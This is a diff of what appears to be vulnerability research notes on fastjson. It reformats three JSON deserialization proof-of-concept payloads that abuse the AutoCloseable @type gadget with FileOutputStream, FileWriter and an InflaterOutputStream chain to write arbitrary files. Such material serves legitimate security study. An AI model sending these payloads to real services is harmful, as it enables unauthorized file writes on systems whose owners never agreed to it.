@@ -661,18 +661,18 @@ poc:
 写文件
 ```json
 {
-    '@type':"java.lang.AutoCloseable",
-    '@type':'java.io.FileOutputStream',
-    'file':'/tmp/nonexist',
-    'append':false
+  "@type": "java.lang.AutoCloseable",
+  "@type": "java.io.FileOutputStream",
+  "file": "/tmp/nonexist",
+  "append": "false"
 }
 ```
 ```json
 {
-    '@type':"java.lang.AutoCloseable",
-    '@type':'java.io.FileWriter',
-    'file':'/tmp/nonexist',
-    'append':false
+  "@type": "java.lang.AutoCloseable",
+  "@type": "java.io.FileWriter",
+  "file": "/tmp/nonexist",
+  "append": "false"
 }
 ```
 
@@ -747,24 +747,21 @@ poc:
 
 ```json
 {
-    '@type':"java.lang.AutoCloseable",
-    '@type':'sun.rmi.server.MarshalOutputStream',
-    'out':
-    {
-        '@type':'java.util.zip.InflaterOutputStream',
-        'out':
-        {
-           '@type':'java.io.FileOutputStream',
-           'file':'dst',
-           'append':false
-        },
-        'infl':
-        {
-            'input':'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=='
-        },
-        'bufLen':1048576
+  "@type": "java.lang.AutoCloseable",
+  "@type": "sun.rmi.server.MarshalOutputStream",
+  "out": {
+    "@type": "java.util.zip.InflaterOutputStream",
+    "out": {
+      "@type": "java.io.FileOutputStream",
+      "file": "dst",
+      "append": "false"
     },
-    'protocolVersion':1
+    "infl": {
+      "input": "eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=="
+    },
+    "bufLen": 1048576
+  },
+  "protocolVersion": 1
 }
 ```
 jdk 8
